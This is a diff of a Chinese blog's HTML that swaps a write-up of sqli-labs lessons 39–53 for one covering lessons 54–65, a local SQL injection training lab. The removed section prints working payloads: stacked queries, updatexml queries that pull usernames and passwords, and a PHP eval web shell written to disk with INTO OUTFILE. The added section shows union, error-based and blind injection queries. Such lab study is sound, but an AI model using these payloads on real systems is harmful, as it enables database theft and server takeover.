@@ -10,7 +10,7 @@
   
   <title>
     
-      sqli-labs-Less39-53 | Hexo
+      sqli-labs-Less54-65 | Hexo
     
   </title>
   <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
@@ -193,7 +193,7 @@
 </header>
 
     <div id="article-banner">
-  <h2>sqli-labs-Less39-53</h2>
+  <h2>sqli-labs-Less54-65</h2>
   <p class="post-date">2021-11-25</p>
   <div class="arrow-down">
     <a href="javascript:;"></a>
@@ -202,49 +202,36 @@
 <main class="app-body flex-box">
   <!-- Article START -->
   <article class="post-article">
-    <section class="markdown-content"><p>继续学习sqli注入，后面基本都是一样的。</p>
+    <section class="markdown-content"><p>不出意外的话，这就是在sqli-labs学习的最后一篇博客了。</p>
 <span id="more"></span>
-<h4 id="Less39-41">Less39-41</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; // Less39</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;; // Less40</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; // Less41</span><br></pre></td></tr></table></figure>
-<p>可以看到Less39没有对id进行包裹，Less40则是用<code>')</code>进行包裹，Less41和Less39的区别就在于Less41对是否参在MySQL注入进行注释，这些关和之前的没有什么区别，我们可以尝试使用堆叠注入进行表的操作。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1;create table try like users; --+</span><br><span class="line">?id=1;drop table try; --+</span><br></pre></td></tr></table></figure>
-<h4 id="Less42-45">Less42-45</h4>
-<p><img src="/2021/11/25/sqli-labs-Less39-53/ll-16377692082981.png" alt></p>
-<p>Less42算是进入到真正的学习，打开后发现这一关与我们之前二次注入跨权限修改密码再登陆很类似，不过这里的方法却和之前的略有不同，打开源码看看，再login.php我们找到可研究的点：<img src="/2021/11/25/sqli-labs-Less39-53/ui-16377692082983.png" alt></p>
-<p>mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符，其主要作用就是预防数据库攻击，那么这里只对user应用该函数，password却没有使用，意味着密码是可以更轻松的被爆破的。包裹的话，Less42是<code>'</code>、Less43是<code>')</code>，同样是使用堆叠注入。<img src="/2021/11/25/sqli-labs-Less39-53/iu-16377692082982.png" alt></p>
-<p>显示密码就把&quot;password&quot;改为&quot;text&quot;就可以了，这个只是方便我们看输入的值，并不影响。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  Less42</span><br><span class="line">a&#x27;;create table try like users;#</span><br><span class="line">a&#x27;;drop table try;#</span><br><span class="line">  Less43</span><br><span class="line">a&#x27;);create table try like users;#</span><br><span class="line">a&#x27;);drop table try;#</span><br><span class="line">  Less44</span><br><span class="line">同Less42，只是没有回显报错信息。</span><br><span class="line">  Less45</span><br><span class="line">同Less43，只是没有回显报错信息。</span><br></pre></td></tr></table></figure>
-<p>一句话木马：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;&#x27; into outfile &#x27;C:\\wamp.64\\www\\pass.php&#x27;;#</span><br></pre></td></tr></table></figure>
-<h4 id="Less46-49">Less46-49</h4>
-<p>我们先来简单了解一下升序和降序：<strong>asc</strong>是指定列按升序排列，<strong>desc</strong>则是指定列按降序排列。</p>
-<p><img src="/2021/11/25/sqli-labs-Less39-53/jx-16377692082984.png" alt></p>
-<p>我们还是先尝试联合注入，行不通过再试试其他的注入方式，最后总结了两种适用的注入方法，分别是报错注入和时间盲注。</p>
-<p><strong>报错注入：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 and updatexml(1,concat(0x7e,(database()),0x7e),1)--+ // 查库</span><br><span class="line">?sort=1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1)--+ // 查表</span><br><span class="line">?sort=1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1)--+ // 查列</span><br><span class="line">?sort=1 and updatexml(1,concat(0x7e,(select group_concat(concat_ws(&#x27;~&#x27;,username,password)) from security.users),0x7e),1)--+ // 查密码</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/11/25/sqli-labs-Less39-53/ds-16377692082985.png" alt></p>
-<p>对于最后查密码时，发现回显的信息不完整，针对这个问题，我们整理了两种解决方法。</p>
-<p>第一种：</p>
-<p>不用group_concat换成limit来单条显示，一条一条查（group_concat和limit不能同时使用）。<img src="/2021/11/25/sqli-labs-Less39-53/rf-16377692082986.png" alt></p>
-<p>第二种：</p>
-<p>是创建一个临时表t，作为最新创建的几条数据的临时表，再到临时表t中取数据。</p>
-<p><strong>时间盲注：</strong></p>
-<p><img src="/2021/11/25/sqli-labs-Less39-53/pas-16377692082988.png" alt></p>
-<p>时间盲注就是借用<code>if()</code>函数判断正确与否，手打的话比较慢，后期可以借用脚本。</p>
-<p>Less46-49就差在有没有单引号包裹和报错回显有没有被注释掉。</p>
-<p>在尝试是否可以写入一句话木马之前，我们先看看能否写入文件，发现是可以的。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-49/?sort=3&#x27; into outfile &#x27;C:\\wamp.64\\www\\sqli-labs-master\\Less-49\\jhuikai.txt&#x27;--+</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/11/25/sqli-labs-Less39-53/hjh-16377692082987.png" alt></p>
-<p>写入一句话木马，我们发现常规的<code>select....into outfile 绝对路径</code>行不通，用括号包裹前半句生成的php文件内容同上面一致，说明一句话木马并没有写入，我们采用其他的方法。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-49/?sort=3&#x27; into outfile &#x27;C:\\wamp.64\\www\\sqli-labs-master\\Less-49\\jhuikai.php&#x27; lines terminated by 0x3c3f70687020406576616c28245f504f53545b2770617373275d293b3f3e--+</span><br></pre></td></tr></table></figure>
-<p><strong>lines terminated by xxx</strong>  以xxx为结尾。</p>
-<p><img src="/2021/11/25/sqli-labs-Less39-53/fas-16377692082989.png" alt></p>
-<h4 id="Less50-53">Less50-53</h4>
-<p>先看源码，Less50的源码还是和之前有点区别的，首先是几个不常见的函数，<code>mysqli_multi_query()</code>、<code>mysqli_store_result()</code>和<code>mysqli_fetch_row()</code>。</p>
-<p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-mysqli-multi-query.html">mysqli_multi_query()</a> 函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。</p>
-<p>mysqli_store_result ( mysqli $link [, int $option ] ),转移上一次查询返回的结果集。<a target="_blank" rel="noopener" href="https://www.jc2182.com/php/php-mysqli-store-result-ref.html">参考链接</a></p>
-<p>mysqli_fetch_row() 函数从结果集中取得一行，并作为枚举数组返回。</p>
-<p>这几关和之前的也是没什么区别，就不需要一一说明了。</p>
+<h4 id="Less54-57">Less54-57</h4>
+<p><img src="/2021/11/25/sqli-labs-Less54-65/54a.png" alt></p>
+<p>进来的页面就大不相同，我们先认真看看给的信息，这应该是数字型的注入，并且告诉我们数据库名为<strong>CHALLENGES</strong>，只有十次的尝试机会，并且每一次重置数据都会生成随机的表明，这个我们在源码中也可以看到，随机数是由大小写字符和数据组成的，并且在源码中注意到是GET方式用<code>'</code>包裹id，已知这些信息，我们采用联合注入开始过关。</p>
+<p><img src="/2021/11/25/sqli-labs-Less54-65/54b.png" alt></p>
+<p>获取表名，这就跟我们之前的操作是一样的，接着获取列名。</p>
+<p><img src="/2021/11/25/sqli-labs-Less54-65/54c.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id,sessid,secret_B1PR,tryy</span><br></pre></td></tr></table></figure>
+<p>查密码，拿到password提交就好了。</p>
+<p><img src="/2021/11/25/sqli-labs-Less54-65/54d.png" alt></p>
+<p>Less55与Less54的不同之处就是尝试次数由10次提升到14次，以及用<code>)</code>包裹id值，Less56则是用<code>')'</code>包裹id值，Less57是<code>&quot;</code>包裹。</p>
+<h4 id="Less58-61">Less58-61</h4>
+<p>Less58对输入的次数做了不超过5次的限制，因为在payload做包裹测试发现回显的数据总不发生变化，然后进一步使用联合语句查询也是同样的，说明联合注入不能使用，这也可以参考源码。</p>
+<p><img src="/2021/11/25/sqli-labs-Less54-65/58a.png" alt></p>
+<p>所以我们采用报错注入的方法试一下，在知道数据库的前提下直接查表。</p>
+<p><img src="/2021/11/25/sqli-labs-Less54-65/58b.png" alt></p>
+<p>查列</p>
+<p><img src="/2021/11/25/sqli-labs-Less54-65/58c.png" alt></p>
+<p>查密码</p>
+<p><img src="/2021/11/25/sqli-labs-Less54-65/58d.png" alt></p>
+<p>也是在差不多五步之内通关的。Less59没有对id进行包裹；Less60用<code>&quot;)</code>对id值进行包裹，并且没有报错回显信息；Less61id值用<code>'))</code>包裹</p>
+<h4 id="Less62-65">Less62-65</h4>
+<p>Less62发现联合注入和报错注入都是没有任何信息回显的，说明需要用到其他方法，所以我们采取布尔盲注和时间盲注，也可以通过他给的测试次数130就想到这里就是盲注的应用了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) and substr((select table_name from information_schema.tables where table_schema=&#x27;challenges&#x27; limit 0,1),1,1)=&#x27; &#x27;--+</span><br><span class="line">?id=1&#x27;) and if(substr((select table_name from information_schema.tables where table_schema=&#x27;challenges&#x27; limit 0,1),1,1)=&#x27;0&#x27;,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
+<p>这是查表使用的盲注，前一个可以用来抓包，毕竟手打很慢，后一个就是利用if函数和sleep在浏览器上测试，只不过比较麻烦，思路大概就是如此，就不一一展示了，抓包根据长度判断如下，这里只抓取首个表名字符，可根据情况选择抓取的字符数。</p>
+<p><img src="/2021/11/25/sqli-labs-Less54-65/62a.png" alt></p>
+<p>Less63用<code>'</code>包裹id值，Less64用<code>))</code>包裹id值，Less65则是用<code>&quot;)</code>包裹，其余的也都一样。</p>
+<h4 id="总结">总结</h4>
+<p>到这里就结束sqli-labs的学习，我们学了五种注入方式，分别是联合注入、报错注入、时间盲注、布尔盲注和堆叠注入，后面，我们需要在实践中做题，真正达到巩固和掌握，SQL注入是CTF中的常见题型，难度不易，是必须掌握的内容。</p>
 </section>
     <!-- Tags START -->
     
@@ -254,20 +241,13 @@
   <div class="nav-container">
     <!-- reverse left and right to put prev and next in a more logic postition -->
     
-      <a class="nav-left" href="/2021/11/21/PHP%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/">
+      <a class="nav-left" href="/2021/11/25/sqli-labs-Less39-53/">
         <span class="nav-arrow">← </span>
         
-          PHP字符串操作
+          sqli-labs-Less39-53
         
       </a>
     
-    
-      <a class="nav-right" href="/2021/11/25/sqli-labs-Less54-65/">
-        
-          sqli-labs-Less54-65
-        
-        <span class="nav-arrow"> →</span>
-      </a>
     
   </div>
 
@@ -319,7 +299,7 @@
   <div class="toc-main">
     <strong class="toc-title">Catalog</strong>
     
-      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less39-41"><span class="toc-nav-text">Less39-41</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less42-45"><span class="toc-nav-text">Less42-45</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less46-49"><span class="toc-nav-text">Less46-49</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less50-53"><span class="toc-nav-text">Less50-53</span></a></li></ol>
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less54-57"><span class="toc-nav-text">Less54-57</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less58-61"><span class="toc-nav-text">Less58-61</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less62-65"><span class="toc-nav-text">Less62-65</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-nav-text">总结</span></a></li></ol>
     
   </div>
 </aside>
@@ -329,7 +309,7 @@
 
 <script>
   (function () {
-    var url = 'http://example.com/2021/11/25/sqli-labs-Less39-53/';
+    var url = 'http://example.com/2021/11/25/sqli-labs-Less54-65/';
     var banner = ''
     if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
       $('#article-banner').css({
